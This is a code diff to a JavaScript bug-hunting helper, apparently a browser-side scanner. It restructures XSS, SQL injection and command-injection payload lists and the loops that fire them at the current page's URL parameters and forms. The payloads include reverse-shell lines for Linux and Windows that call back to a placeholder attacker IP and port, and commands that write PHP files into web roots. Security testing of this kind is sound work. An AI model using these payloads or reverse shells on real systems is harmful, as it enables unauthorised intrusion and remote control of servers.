@@ -22,30 +22,36 @@ function JsBugHuntingHelper () {
   this.attackerIp = ''
   this.attackerPort = ''
 
+  const previousXssAction = 'null'
+  const genericXssResult = "data.indexOf('alert(\"XSS_VULNERABLE_PARAM\")') !== -1"
   const payloadsXSS = [
-    '<script>alert("XSS_VULNERABLE_PARAM")</script>',
-    '"><script>alert("XSS_VULNERABLE_PARAM")</script><div class="',
-    '<svg/onload=alert("XSS_VULNERABLE_PARAM")>'
-    // questo in realtà sarebbe un bug del PHP SELF, da aggiungere tra la fine dell'url e il ? dei parametri
-    // '/"><script>alert("XSS_VULNERABLE_PARAM")</script><span "'
+    { previousAction: previousXssAction, payloadString: '<script>alert("XSS_VULNERABLE_PARAM")</script>', expectedResult: genericXssResult },
+    { previousAction: previousXssAction, payloadString: '"><script>alert("XSS_VULNERABLE_PARAM")</script><div class="', expectedResult: genericXssResult },
+    { previousAction: previousXssAction, payloadString: '<svg/onload=alert("XSS_VULNERABLE_PARAM")>', expectedResult: genericXssResult }
   ]
-  const payloadsSQLi = ['"', "'"]
 
-  const previousRceAction = "data = data.replace('echo+TEST_RCE','').replace('echo TEST_RCE','').replace(\"'TEST_RCE'\",'')"
+  const previousErrorBasedSqliAction = 'null'
+  const errorBasedSqliResult = "data.indexOf('Uncaught mysql') !== -1"
+  const payloadsSQLi = [
+    { previousAction: previousErrorBasedSqliAction, payloadString: '"', expectedResult: errorBasedSqliResult },
+    { previousAction: previousErrorBasedSqliAction, payloadString: "'", expectedResult: errorBasedSqliResult }
+  ]
+
+  const previousRceAction = "data = data.replace('echo+TEST_RCE','').replace('echo TEST_RCE','').replace('/testRCE.php','').replace(\"'TEST_RCE'\",'')"
   const genericRceResult = "data.indexOf('TEST_RCE') !== -1"
   const payloadsRCE = [
-    { payloadString: 'test" || echo TEST_RCE > /var/www/html/testRCE.php && cat /var/www/html/testRCE.php || "', expectedResult: genericRceResult },
-    { payloadString: 'test" || echo TEST_RCE > /var/www/testRCE.php && cat /var/www/testRCE.php || "', expectedResult: genericRceResult },
-    { payloadString: '"+%26%26+echo+TEST_RCE+%26%26+"', expectedResult: genericRceResult },
-    { payloadString: '" && echo TEST_RCE && "', expectedResult: genericRceResult },
-    { payloadString: 'echo TEST_RCE', expectedResult: genericRceResult },
-    { payloadString: '1" && echo TEST_RCE #', expectedResult: genericRceResult },
-    { payloadString: '" || echo TEST_RCE ||', expectedResult: genericRceResult },
+    { previousAction: previousRceAction, payloadString: 'test" || echo TEST_RCE > /var/www/html/testRCE.php && cat /var/www/html/testRCE.php || "', expectedResult: genericRceResult },
+    { previousAction: previousRceAction, payloadString: 'test" || echo TEST_RCE > /var/www/testRCE.php && cat /var/www/testRCE.php || "', expectedResult: genericRceResult },
+    { previousAction: previousRceAction, payloadString: '"+%26%26+echo+TEST_RCE+%26%26+"', expectedResult: genericRceResult },
+    { previousAction: previousRceAction, payloadString: '" && echo TEST_RCE && "', expectedResult: genericRceResult },
+    { previousAction: previousRceAction, payloadString: 'echo TEST_RCE', expectedResult: genericRceResult },
+    { previousAction: previousRceAction, payloadString: '1" && echo TEST_RCE #', expectedResult: genericRceResult },
+    { previousAction: previousRceAction, payloadString: '" || echo TEST_RCE ||', expectedResult: genericRceResult },
     /* Linux payload */
-    { payloadString: '1" || /bin/bash -c \'bash -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\' #', expectedResult: genericRceResult },
+    { previousAction: previousRceAction, payloadString: '1" || /bin/bash -c \'bash -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\' #', expectedResult: genericRceResult },
     // '1" || /bin/bash -c \'bash -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1'",
     /* Windows payload */
-    { payloadString: '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c \\"bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\\"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php #', expectedResult: genericRceResult }
+    { previousAction: previousRceAction, payloadString: '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c \\"bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\\"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php #', expectedResult: genericRceResult }
     // '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c \\"bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\\"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php'
     // '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c "bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php #',
     // '1" && echo ^<?php > file2.php && echo $cmd=^"bash.exe -c \\"bash.exe -i >& /dev/tcp/[ATTACKERIP]/[ATTACKERPORT] 0>&1\\"^"; >> file2.php && echo exec($cmd); >> file2.php && echo ?^> >> file2.php && php file2.php #'
@@ -493,23 +499,21 @@ function JsBugHuntingHelper () {
     for (let i = 0; i < paramsEntitiesTemp.length; i++) {
       for (const payload of payloadsXSS) {
         const paramsEntities = Object.entries(getAllUrlParams(document.location.href))
-        const v = paramsEntities[i]
-        v[1] = v[1] + payload
+        const newUrl2 = document.location.origin + document.location.pathname
 
-        const mod = paramsEntities.map((v) => {
-          return v[0] + '=' + v[1]
-        })
-
-        const newUrl = document.location.origin + document.location.pathname + '?' + mod.join('&')
-
-        // eslint-disable-next-line no-undef
-        try {
-          await $.get(newUrl).done(function (data) {
-            if (data.indexOf('alert("XSS_VULNERABLE_PARAM")') !== -1) {
-              result.push({ paramName: v[0], type: 'XSS via Url', url: newUrl })
-            }
-          })
-        } catch (reason) { console.log(reason) }
+        const r = await new Payload(
+          newUrl2,
+          'GET',
+          paramsEntities,
+          payload.previousAction,
+          payload.payloadString,
+          // eslint-disable-next-line no-useless-escape
+          payload.expectedResult,
+          'XSS'
+        ).isValidResponse()
+        if (r !== false) {
+          result.push(r)
+        }
       }
     }
     return result
@@ -522,23 +526,21 @@ function JsBugHuntingHelper () {
     for (let i = 0; i < paramsEntitiesTemp.length; i++) {
       for (const payload of payloadsSQLi) {
         const paramsEntities = Object.entries(getAllUrlParams(document.location.href))
-        const v = paramsEntities[i]
-        v[1] = v[1] + payload
+        const newUrl2 = document.location.origin + document.location.pathname
 
-        const mod = paramsEntities.map((v) => {
-          return v[0] + '=' + v[1]
-        })
-
-        const newUrl = document.location.origin + document.location.pathname + '?' + mod.join('&')
-
-        // eslint-disable-next-line no-undef
-        try {
-          await $.get(newUrl).done(function (data) {
-            if (data.indexOf('Uncaught mysql') !== -1) {
-              result.push({ paramName: v[0], type: 'SQL Injection via Url', url: newUrl })
-            }
-          })
-        } catch (reason) { console.log(reason) }
+        const r = await new Payload(
+          newUrl2,
+          'GET',
+          paramsEntities,
+          payload.previousAction,
+          payload.payloadString,
+          // eslint-disable-next-line no-useless-escape
+          payload.expectedResult,
+          'SQL Injection'
+        ).isValidResponse()
+        if (r !== false) {
+          result.push(r)
+        }
       }
     }
     return result
@@ -557,7 +559,7 @@ function JsBugHuntingHelper () {
           newUrl2,
           'GET',
           paramsEntities,
-          previousRceAction,
+          payload.previousAction,
           payload.payloadString.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort),
           // eslint-disable-next-line no-useless-escape
           payload.expectedResult,
@@ -610,7 +612,7 @@ function JsBugHuntingHelper () {
           // console.log(tempParams, i, tempParams.length, tempParams[i])
 
           if (tempParams[i] !== undefined) {
-            tempParams[i].value += payload
+            tempParams[i].value += payload.payloadString
 
             const form = document.createElement('form')
             form.method = method
@@ -637,7 +639,7 @@ function JsBugHuntingHelper () {
           // console.log(tempParams, i, tempParams.length, tempParams[i])
 
           if (tempParams[i] !== undefined) {
-            tempParams[i].value += payload
+            tempParams[i].value += payload.payloadString
 
             const form = document.createElement('form')
             form.method = method
@@ -715,7 +717,7 @@ function JsBugHuntingHelper () {
             })
             // console.log(tempParams, i, tempParams.length)
             if (tempParams[i] !== undefined) {
-              tempParams[i].value += payload
+              tempParams[i].value += payload.payloadString
               result.push(await sendFormRequest.call(this, form, tempParams, 'XSS', tempParams[i].name))
             }
           }
@@ -748,7 +750,7 @@ function JsBugHuntingHelper () {
               }
             })
             if (tempParams[i] !== undefined) {
-              tempParams[i].value += payload
+              tempParams[i].value += payload.payloadString
               result.push(await sendFormRequest.call(this, form, tempParams, 'SQLi', tempParams[i].name))
             }
           }
